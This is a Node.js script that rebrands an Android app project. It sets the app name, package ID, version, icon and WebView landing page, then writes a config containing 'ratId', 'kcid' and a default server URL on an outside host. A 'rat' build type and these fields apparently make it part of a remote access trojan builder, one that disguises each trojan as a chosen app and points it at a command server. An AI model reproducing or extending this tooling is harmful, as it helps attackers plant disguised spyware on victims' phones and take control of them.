#!/usr/bin/env node
const fs = require('fs');
const path = require('path');

const configPath = process.argv[2];
const appDir = process.argv[3];

if (!configPath || !appDir) {
  console.error('Usage: node modify-apk.js <config.json> <app_dir>');
  process.exit(1);
}

const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
console.log('[MODIFY] Config:', JSON.stringify({ ...config, icon: config.icon ? '(base64)' : null }, null, 2));

function setAppName(stringsPath, appName) {
  if (!fs.existsSync(stringsPath)) {
    console.log('[MODIFY] strings.xml not found at:', stringsPath);
    return;
  }
  let xml = fs.readFileSync(stringsPath, 'utf8');
  xml = xml.replace(
    /<string name="app_name">.*?<\/string>/,
    `<string name="app_name">${appName}</string>`
  );
  fs.writeFileSync(stringsPath, xml);
  console.log('[MODIFY] App name set to:', appName);
}

function setPackageAndVersion(buildGradlePath, config) {
  if (!buildGradlePath || !fs.existsSync(buildGradlePath)) {
    console.log('[MODIFY] build.gradle.kts not found, trying AndroidManifest.xml');
    return;
  }
  let gradle = fs.readFileSync(buildGradlePath, 'utf8');
  if (config.packageName) {
    gradle = gradle.replace(/applicationId\s*=\s*"[^"]*"/, `applicationId = "${config.packageName}"`);
    gradle = gradle.replace(/namespace\s*=\s*"[^"]*"/, `namespace = "${config.packageName}"`);
  }
  if (config.versionCode) {
    gradle = gradle.replace(/versionCode\s*=\s*\d+/, `versionCode = ${config.versionCode}`);
  }
  if (config.versionName) {
    gradle = gradle.replace(/versionName\s*=\s*"[^"]*"/, `versionName = "${config.versionName}"`);
  }
  fs.writeFileSync(buildGradlePath, gradle);
  console.log('[MODIFY] Package:', config.packageName, 'Version:', config.versionName);
}

function setIcon(resDir, iconBase64) {
  if (!iconBase64 || !fs.existsSync(resDir)) return;
  console.log('[MODIFY] Setting custom icon...');

  const base64Data = iconBase64.replace(/^data:image\/\w+;base64,/, '');
  const buffer = Buffer.from(base64Data, 'base64');

  const densities = {
    'mipmap-mdpi': 48,
    'mipmap-hdpi': 72,
    'mipmap-xhdpi': 96,
    'mipmap-xxhdpi': 144,
    'mipmap-xxxhdpi': 192,
  };

  for (const [folder, size] of Object.entries(densities)) {
    const targetDir = path.join(resDir, folder);
    if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });

    ['ic_launcher.png', 'ic_launcher_round.png'].forEach(name => {
      fs.writeFileSync(path.join(targetDir, name), buffer);
    });
  }
  console.log('[MODIFY] Icon set for', Object.keys(densities).length, 'densities');
}

function setWebViewContent(assetsDir, config) {
  if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });

  const customDir = path.join(assetsDir, 'custom');
  if (!fs.existsSync(customDir)) fs.mkdirSync(customDir, { recursive: true });

  let htmlContent = '';
  let landingWeb = '';

  if (config.template && config.template !== 'custom' && config.template !== 'blank') {
    const templateDir = path.join(__dirname, '..', 'templates', config.template);
    if (fs.existsSync(templateDir)) {
      const indexFile = path.join(templateDir, 'index.html');
      if (fs.existsSync(indexFile)) {
        htmlContent = fs.readFileSync(indexFile, 'utf8');
      }
      // Copy other template files
      fs.readdirSync(templateDir).forEach(f => {
        if (f !== 'index.html' && f !== 'meta.json') {
          const src = path.join(templateDir, f);
          const dest = path.join(customDir, f);
          fs.copyFileSync(src, dest);
          console.log('[MODIFY] Copied template file:', f);
        }
      });
    }
  } else if (config.template === 'custom' && config.customHtml) {
    htmlContent = config.customHtml;
  }

  if (htmlContent) {
    fs.writeFileSync(path.join(customDir, 'index.html'), htmlContent);
    console.log('[MODIFY] WebView HTML set from template:', config.template);
  }

  if (config.customUrl) {
    landingWeb = config.customUrl;
  } else if (htmlContent) {
    landingWeb = 'file:///android_asset/custom/index.html';
  }

  return landingWeb;
}

function setAppConfig(configPath, config, landingWeb) {
  const dir = path.dirname(configPath);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });

  const appConfig = {
    ratId: config.ratId || '',
    kcid: config.kcid || '',
    baseUrl: config.baseUrl || 'http://hamnzx.clouderz.my.id:2000',
    landing_web: landingWeb || '',
  };
  fs.writeFileSync(configPath, JSON.stringify(appConfig, null, 2));
  console.log('[MODIFY] Config saved:', configPath);
  console.log('[MODIFY] ratId:', appConfig.ratId, 'kcid:', appConfig.kcid);
}

function setAndroidManifestPackageName(manifestPath, packageName) {
  if (!manifestPath || !fs.existsSync(manifestPath)) return;
  let manifest = fs.readFileSync(manifestPath, 'utf8');

  // Update package in manifest (if it's an old-style manifest)
  if (manifest.includes('package=')) {
    manifest = manifest.replace(/package="[^"]*"/, `package="${packageName}"`);
  }

  // Update android:authorities to avoid conflicts
  const oldAuthority = manifest.match(/android:authorities="([^"]*?)"/);
  if (oldAuthority) {
    manifest = manifest.replace(
      /android:authorities="[^"]*"/,
      `android:authorities="${packageName}.fileprovider"`
    );
  }

  fs.writeFileSync(manifestPath, manifest);
  console.log('[MODIFY] AndroidManifest package updated');
}

// Main
try {
  // Find resources
  const stringsPath = path.join(appDir, 'res', 'values', 'strings.xml');
  const buildGradlePath = path.join(appDir, 'build.gradle.kts');
  const buildGradlePathAlt = path.join(appDir, 'build.gradle');
  const manifestPath = path.join(appDir, 'AndroidManifest.xml');
  const resDir = path.join(appDir, 'res');
  const assetsDir = path.join(appDir, 'assets');

  // 1. Set App Name
  if (config.appName) {
    setAppName(stringsPath, config.appName);
    // Also try to update activity label in manifest
    if (fs.existsSync(manifestPath)) {
      let manifest = fs.readFileSync(manifestPath, 'utf8');
      manifest = manifest.replace(
        /android:label="@string\/app_name"/g,
        `android:label="${config.appName}"`
      );
      fs.writeFileSync(manifestPath, manifest);
    }
  }

  // 2. Set Package Name + Version
  const gradlePath = fs.existsSync(buildGradlePath) ? buildGradlePath : buildGradlePathAlt;
  setPackageAndVersion(gradlePath, config);

  // 3. Set Icon
  if (config.icon) {
    setIcon(resDir, config.icon);
  }

  // 4. Set WebView Content
  const landingWeb = setWebViewContent(assetsDir, config);

  // 5. Set App Config (ratId / kcid)
  let configJsonPath;
  if (config.type === 'rat') {
    configJsonPath = path.join(assetsDir, 'custom', 'config.json');
  } else {
    configJsonPath = path.join(assetsDir, 'config.json');
  }
  setAppConfig(configJsonPath, config, landingWeb);

  // 6. Update AndroidManifest package
  if (config.packageName && fs.existsSync(manifestPath)) {
    setAndroidManifestPackageName(manifestPath, config.packageName);
  }

  console.log('[MODIFY] ✅ All resources modified successfully!');
} catch (e) {
  console.error('[MODIFY] ❌ Error:', e.message);
  process.exit(1);
}
